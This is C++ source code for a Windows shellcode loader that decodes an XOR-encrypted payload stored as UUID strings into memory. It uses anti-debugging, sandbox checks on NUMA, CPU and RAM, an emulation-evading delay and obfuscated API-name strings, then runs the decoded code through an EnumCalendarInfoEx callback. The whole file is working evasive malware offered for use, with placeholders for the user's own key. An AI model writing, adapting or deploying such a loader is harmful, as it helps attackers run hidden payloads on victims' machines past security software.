#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <rpc.h>

// set your xor key( it should be similar to the one you used in the "xor_encryptor.py" )
#define XOR_KEY "<YOUR_XOR_KEY>"

#define EXE_NAME "lazarus.exe"

// Uncomment the line below if you're using Visual Studio for compiling.
// #pragma comment(lib, "Rpcrt4.lib")

BOOL(WINAPI *pMVP)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
LPVOID(WINAPI *pMVA)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

typedef LPVOID(WINAPI *pVirtualAllocExNuma)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType,
                                            DWORD flProtect, DWORD nndPreferred);

bool checkNUMA()
{
        LPVOID mem{NULL};
        const char k32DllName[13]{ 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
        const char vAllocExNuma[19]{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', 'N', 'u', 'm', 'a', 0x0 };
        pVirtualAllocExNuma myVirtualAllocExNuma =
            (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle(k32DllName), vAllocExNuma);
        mem =
            myVirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
        if (mem != NULL)
        {
                return false;
        }
        else
        {
                return true;
        }
}

bool checkResources()
{
        SYSTEM_INFO s{};
        MEMORYSTATUSEX ms{};
        DWORD procNum{};
        DWORD ram{};

        GetSystemInfo(&s);
        procNum = s.dwNumberOfProcessors;
        if (procNum < 2)
                return false;

        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
        if (ram < 2)
                return false;

        return true;
}

void XOR(char *data, unsigned long data_len, char *key, unsigned long key_len)
{
        for (int i{0}; i < data_len; ++i)
        {
                data[i] ^= key[i % key_len];
        }
}

int getposition(unsigned char array[], size_t size)
{
        for (int i{0}; i < size; i++)
        {
                if (array[i] == ',')
                {
                        return i;
                }
        }
        return 0;
}

int main(int argc, char *argv[])
{

        unsigned char payload[]{
            0x4b, 0x12, 0x55, 0x56, 0x47, 0x43, 0x5c, 0x3,  0x2,  0x49, 0xb,  0x57, 0x11, 0x47, 0x44, 0x47, 0x51, 0xd,
            0x44, 0x5a, 0x54, 0x55, 0x51, 0x54, 0x43, 0x5b, 0x46, 0x42, 0x58, 0x43, 0x50, 0x5b, 0x44, 0x42, 0x56, 0x50,
            0x50, 0x46, 0x42, 0x65, 0x55, 0x13, 0x5b, 0x44, 0x50, 0x5a, 0x4c, 0x42, 0x52, 0x48, 0x55, 0x5c, 0x58, 0x5a,
            0x5a, 0x42, 0x5b, 0x4f, 0x3,  0x43, 0x42, 0x47, 0x50, 0x5d, 0x4c, 0x5c, 0xc,  0x5a, 0x45, 0x46, 0x51, 0x43,
            0x59, 0x56, 0x16, 0x42, 0x56, 0x47, 0x4d, 0x6e, 0x4c, 0x58, 0x45, 0x4f, 0xb,  0x43, 0x59, 0x5c, 0x44, 0x5a,
            0x50, 0x5d, 0x54, 0x54, 0x43, 0xd,  0x40, 0x47, 0xf,  0x5a, 0x55, 0xf,  0x40, 0x16, 0x49, 0x51, 0x5,  0x57,
            0x5f, 0xc,  0x4e, 0x43, 0x51, 0x44, 0x50, 0xd,  0x44, 0x55, 0x48, 0x6f, 0x43, 0x53, 0xd,  0x59, 0x46, 0x44,
            0xa,  0x16, 0x2,  0x43, 0x46, 0x14, 0x54, 0x57, 0x4c, 0x50, 0x5f, 0x5d, 0x47, 0x5a, 0xa,  0x46, 0x2,  0x57,
            0x59, 0x47, 0x0,  0x51, 0x50, 0x54, 0x5f, 0xc,  0x46, 0x12, 0x5b, 0x12, 0x5,  0x4c, 0x58, 0x7d, 0x46, 0x51,
            0x59, 0x51, 0x5f, 0x5b, 0x46, 0x42, 0x5b, 0x5a, 0x54, 0x5c, 0x4c, 0x15, 0x49, 0x5d, 0x3,  0x56, 0x5e, 0x42,
            0x43, 0x45, 0x5a, 0x14, 0x4c, 0x5a, 0x4c, 0x47, 0x55, 0x1,  0x51, 0x5c, 0xc,  0x57, 0x47, 0x4f, 0x51, 0x55,
            0x4d, 0x64, 0x56, 0x43, 0x5c, 0x55, 0x51, 0x54, 0x5e, 0x5f, 0x47, 0x5a, 0xa,  0x47, 0x59, 0x5b, 0x59, 0x41,
            0x53, 0x52, 0x55, 0x49, 0x5a, 0x57, 0x47, 0x46, 0x44, 0x13, 0x51, 0x5b, 0x44, 0x4f, 0x6,  0x51, 0x59, 0x55,
            0x56, 0x5b, 0x43, 0x55, 0x45, 0x7d, 0x43, 0x5a, 0x4d, 0x45, 0x54, 0x51, 0x51, 0x5c, 0xc,  0x42, 0x13, 0x47,
            0x59, 0x46, 0x4c, 0x5b, 0x42, 0x12, 0x57, 0x48, 0x55, 0x5c, 0x8,  0x9,  0x5a, 0x14, 0x50, 0x43, 0x50, 0x56,
            0x16, 0x44, 0x50, 0x5d, 0x59, 0x50, 0x56, 0x4d, 0x5b, 0x7d, 0x4b, 0x44, 0x50, 0x5a, 0x10, 0x13, 0x52, 0x55,
            0x50, 0x49, 0x5a, 0x57, 0x14, 0x4e, 0x44, 0x14, 0x51, 0x5d, 0x45, 0x5a, 0x5,  0x6,  0x55, 0x55, 0x43, 0xc,
            0x46, 0x14, 0x50, 0x47, 0x5,  0x5a, 0x45, 0x47, 0x55, 0x6,  0x50, 0x46, 0x42, 0x65, 0x55, 0x11, 0x58, 0x40,
            0x54, 0xb,  0x44, 0x44, 0x5c, 0x48, 0x51, 0x57, 0x5a, 0xc,  0x5a, 0x45, 0x5d, 0x43, 0x2,  0x43, 0x44, 0x4f,
            0x50, 0x50, 0x4c, 0x57, 0x57, 0xb,  0x46, 0x40, 0x5c, 0x13, 0x59, 0x5b, 0x4c, 0x43, 0x50, 0x47, 0x4d, 0x6e,
            0x4c, 0x5b, 0x4e, 0x45, 0x5d, 0x43, 0x51, 0x56, 0x16, 0x5a, 0x0,  0x55, 0x51, 0x55, 0x43, 0x5b, 0x46, 0x41,
            0x5f, 0x5a, 0x59, 0xc,  0x44, 0x14, 0x49, 0x51, 0x59, 0x50, 0x5a, 0x57, 0x15, 0x43, 0x59, 0x46, 0x2,  0x5a,
            0x4d, 0x55, 0x48, 0x6f, 0x43, 0x5c, 0xc,  0x5b, 0x46, 0x13, 0x59, 0x47, 0x50, 0x43, 0x4c, 0x4f, 0x54, 0x51,
            0x4c, 0x54, 0x5f, 0x5b, 0x4f, 0x5a, 0xd,  0x47, 0x55, 0x5f, 0x59, 0x42, 0x5c, 0x51, 0x50, 0x51, 0x56, 0x5a,
            0x12, 0x42, 0x50, 0x42, 0x0,  0x4c, 0x58, 0x7d, 0x46, 0x50, 0x58, 0x50, 0x5f, 0x5a, 0x4f, 0x43, 0x58, 0x5a,
            0x54, 0xf,  0x40, 0x46, 0x49, 0x5d, 0x52, 0x50, 0x56, 0x42, 0x12, 0x14, 0x5b, 0x47, 0x4c, 0x5a, 0x45, 0x42,
            0x56, 0x3,  0x7,  0x1,  0x5e, 0x5a, 0x4f, 0x43, 0x58, 0x55, 0x4d, 0x64, 0x56, 0x4f, 0x6,  0x51, 0x59, 0x51,
            0xf,  0x5a, 0x4e, 0x5a, 0xc,  0x4e, 0x50, 0x5c, 0x59, 0x11, 0x2,  0x50, 0x56, 0x49, 0x8,  0x9,  0x11, 0x11,
            0x44, 0x42, 0x5,  0x5a, 0x4d, 0x15, 0x1,  0x52, 0x56, 0x53, 0x5d, 0x5c, 0x45, 0x55, 0x45, 0x7d, 0x43, 0x5e,
            0x44, 0x44, 0x56, 0x56, 0x52, 0x51, 0x8,  0x42, 0x43, 0x46, 0x59, 0x47, 0x4c, 0x5a, 0x4d, 0x42, 0x52, 0x48,
            0x59, 0x5d, 0xb,  0x59, 0x5a, 0x43, 0x51, 0x4f, 0x50, 0xb,  0x17, 0x16, 0x54, 0x55, 0x50, 0x54, 0x5e, 0x4d,
            0x5b, 0x7d, 0x4b, 0x12, 0x54, 0x56, 0x4d, 0x43, 0x5d, 0x55, 0x51, 0x49, 0xc,  0xc,  0x43, 0x4e, 0x44, 0x47,
            0x51, 0x5e, 0x46, 0x5a, 0x55, 0x54, 0x54, 0x7,  0x43, 0xc,  0x47, 0x16, 0x51, 0x47, 0x50, 0x5e, 0x47, 0x43,
            0x55, 0x50, 0x55, 0x46, 0x42, 0x65, 0x55, 0x43, 0xa,  0x12, 0x55, 0x56, 0x4d, 0x43, 0x5d, 0x48, 0x7,  0x55,
            0x56, 0x56, 0x5a, 0x15, 0x8,  0x43, 0x50, 0x43, 0x40, 0x14, 0x53, 0x52, 0x4c, 0x56, 0x58, 0x5f, 0x40, 0x11,
            0xf,  0x13, 0x54, 0x5a, 0x17, 0x4f, 0x5d, 0x47, 0x4d, 0x6e, 0x4c, 0x5f, 0x46, 0x47, 0x58, 0x41, 0x59, 0xb,
            0x15, 0x5a, 0x54, 0x55, 0x51, 0x54, 0x43, 0x5b, 0x46, 0x42, 0x50, 0x5a, 0x3,  0xf,  0x46, 0x4e, 0x49, 0x5d,
            0x51, 0x52, 0xc,  0x5f, 0x47, 0x11, 0xf,  0x13, 0x54, 0x5b, 0x44, 0x55, 0x48, 0x6f, 0x43, 0x7,  0x57, 0x5c,
            0x46, 0x43, 0xd,  0x42, 0x51, 0x43, 0x47, 0x46, 0x50, 0x1,  0x4c, 0x50, 0x56, 0xc,  0x47, 0x5a, 0xf,  0x11,
            0x2,  0x5e, 0x59, 0x43, 0x5c, 0x5d, 0x58, 0x7,  0x5c, 0x5b, 0x4f, 0x11, 0xf,  0x14, 0x51, 0x4c, 0x58, 0x7d,
            0x46, 0x51, 0x50, 0x7,  0x5f, 0x57, 0x4e, 0x43, 0x51, 0x5a, 0x4,  0xf,  0x16, 0x16, 0x49, 0x1,  0x7,  0x54,
            0x8,  0x42, 0x12, 0x47, 0xf,  0x11, 0x4c, 0xa,  0x41, 0x43, 0x5c, 0x5d, 0x58, 0x7,  0x59, 0x59, 0x16, 0x46,
            0x59, 0x55, 0x4d, 0x64, 0x56, 0x4f, 0x5d, 0x51, 0x2,  0x51, 0x56, 0x5b, 0x46, 0x5a, 0x5d, 0x4f, 0x4,  0x5c,
            0x59, 0x11, 0x5d, 0x5d, 0x58, 0x49, 0x5a, 0x5e, 0x15, 0x16, 0x44, 0x4e, 0x58, 0xf,  0x41, 0x40, 0x50, 0x53,
            0x50, 0x2,  0x8,  0xb,  0x42, 0x55, 0x45, 0x7d, 0x43, 0x5a, 0x44, 0x14, 0x50, 0x5d, 0x50, 0x50, 0x56, 0x42,
            0x47, 0x47, 0x59, 0x45, 0x4c, 0x5a, 0x4d, 0x47, 0x54, 0x48, 0x3,  0x5c, 0x58, 0x5c, 0x5a, 0x41, 0xd,  0x41,
            0x55, 0x5e, 0x44, 0x47, 0x54, 0x55, 0x51, 0x54, 0x5e, 0x4d, 0x5b, 0x7d, 0x4b, 0x43, 0x50, 0x5b, 0x44, 0x43,
            0x55, 0x55, 0x51, 0x49, 0x5a, 0x57, 0x42, 0x47, 0x44, 0x12, 0x53, 0x56, 0x4d, 0x5a, 0x51, 0x52, 0x54, 0x53,
            0x43, 0x5a, 0x40, 0x43, 0xd,  0x44, 0x50, 0xd,  0x44, 0x41, 0x5,  0x55, 0x5,  0x46, 0x42, 0x65, 0x55, 0x12,
            0x5b, 0x42, 0x51, 0x5a, 0x45, 0x42, 0x5d, 0x48, 0x57, 0x52, 0x8,  0xc,  0x5a, 0x43, 0x5d, 0x14, 0x56, 0x43,
            0x46, 0x43, 0x51, 0x51, 0x4c, 0x54, 0x5f, 0x5f, 0x46, 0x43, 0x51, 0x4f, 0x5,  0x5a, 0x40, 0x45, 0x50, 0x47,
            0x4d, 0x6e, 0x4c, 0x59, 0x4f, 0x47, 0x59, 0x14, 0x57, 0x5f, 0x4c, 0x5a, 0x5c, 0x5c, 0x55, 0x5c, 0x43, 0x5a,
            0x41, 0x12, 0x5f, 0x5a, 0x54, 0x5e, 0x40, 0x46, 0x49, 0x50, 0x51, 0x50, 0x5f, 0x5a, 0x47, 0x43, 0x58, 0x42,
            0x51, 0x5a, 0x4d, 0x55, 0x48, 0x6f, 0x43, 0x51, 0x5e, 0x5b, 0x46, 0x14, 0x59, 0x11, 0x7,  0x43, 0x12, 0x11,
            0x50, 0x5c, 0x4c, 0x50, 0xa,  0xc,  0x4f, 0x5a, 0x51, 0x4e, 0x2,  0x5f, 0x59, 0x43, 0x7,  0x5d, 0x58, 0x7,
            0x5f, 0x5b, 0x46, 0x15, 0x8,  0x40, 0x58, 0x4c, 0x58, 0x7d, 0x46, 0x3,  0x7,  0x5c, 0x58, 0x5c, 0x11, 0x14,
            0xa,  0x5a, 0x55, 0x56, 0x10, 0x42, 0x49, 0x1,  0x53, 0x57, 0x5f, 0x42, 0x43, 0x4f, 0xf,  0x11, 0x4c, 0xd,
            0x15, 0x4f, 0x6,  0x55, 0x4,  0x50, 0x5f, 0xd,  0x16, 0x47, 0x51, 0x55, 0x4d, 0x64, 0x56, 0x11, 0x2,  0x53,
            0x51, 0x55, 0xa,  0x57, 0x40, 0x5a, 0xb,  0x15, 0x5,  0x5b, 0x59, 0x15, 0x51, 0x3,  0x51, 0x49, 0xf,  0x5d,
            0x42, 0x41, 0x44, 0x43, 0x50, 0xc,  0x15, 0x16, 0x52, 0x5c, 0x54, 0x6,  0xa,  0x56, 0x13, 0x55, 0x45, 0x7d,
            0x43, 0x56, 0x47, 0x43, 0x5c, 0x1,  0x54, 0x2,  0x8,  0x42, 0x45, 0x4f, 0xa,  0x43, 0x4c, 0x5e, 0x42, 0x44,
            0x7,  0x48, 0x56, 0x7,  0x5e, 0xe,  0x5a, 0x4f, 0x59, 0x11, 0x3,  0xb,  0x44, 0x40, 0x51, 0x55, 0x54, 0x6,
            0xc,  0x4d, 0x5b, 0x7d, 0x4b, 0x41, 0x7,  0x59, 0x46, 0x46, 0x57, 0x51, 0x56, 0x49, 0x5e, 0x5f, 0x41, 0x16,
            0x44, 0x43, 0x50, 0x5b, 0x4d, 0x5a, 0x5c, 0x5c, 0x5,  0x5,  0x43, 0x9,  0x11, 0x13, 0x5c, 0x4e, 0x51, 0x57,
            0x44, 0x4e, 0x54, 0x5c, 0x51, 0x46, 0x42, 0x65};

        char key[]{XOR_KEY};

        FreeConsole();

        if (strstr(argv[0], EXE_NAME) == NULL)
        {
                return -2;
        }

        if (IsDebuggerPresent())
        {
                return -2;
        }

        if (checkNUMA())
        {
                return -2;
        }

        if (checkResources() == false)
        {
                return -2;
        }

        Sleep(3000);

        char *mem{(char *)malloc(100000000)};
        if (mem != NULL)
        {
                memset(mem, 0x0, 100000000);
                free(mem);

                XOR((char *)payload, sizeof(payload), key, sizeof(key));

                int loops{sizeof(payload) / 39};

                const char k32DllName[13]{ 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
                HMODULE k32_handle{GetModuleHandle(k32DllName)};
                BOOL rv{};
                char chars_array[39]{};
                DWORD oldprotect{0};
                char *temp{};
                printf("1 %s\n", payload);

                const char vAlloc[13]{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
                pMVA = GetProcAddress(k32_handle, vAlloc);
                PVOID mem = pMVA(0, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                DWORD_PTR hptr = (DWORD_PTR)mem;

                for (int i{0}; i < loops; i++)
                {
                        temp = strtok(payload, "\",\n");
                        strcpy(chars_array, temp);
                        printf("substring %s\n", chars_array);
                        RPC_CSTR rcp_cstr = (RPC_CSTR)chars_array;
                        RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID *)hptr);
                        if (status != RPC_S_OK)
                        {
                                printf("[-] UUID convert error\n");
                                CloseHandle(mem);
                                return -1;
                        }
                        int pos{getposition(payload, sizeof(payload))};
                        if (pos > 0)
                        {
                                pos += 2;
                                int gap{sizeof(payload) - pos};
                                memcpy(payload, &payload[pos], gap);
                        }
                        hptr += 16;
                }

                const char virtProt[15] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
                pMVP = GetProcAddress(k32_handle, virtProt);
                rv = pMVP(mem, 0x100000, PAGE_EXECUTE_READ, &oldprotect);
                if (!rv)
                {
                        fprintf(stderr, "[-] Failed to change the permissions for shellcode's memory\n");
                        return EXIT_FAILURE;
                }

                // attack! boom! we like planning events! :)
                EnumCalendarInfoEx((CALINFO_ENUMPROCEX)mem, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
                CloseHandle(mem);

                return 0;
        }
        else
        {
                return EXIT_FAILURE;
        }
}
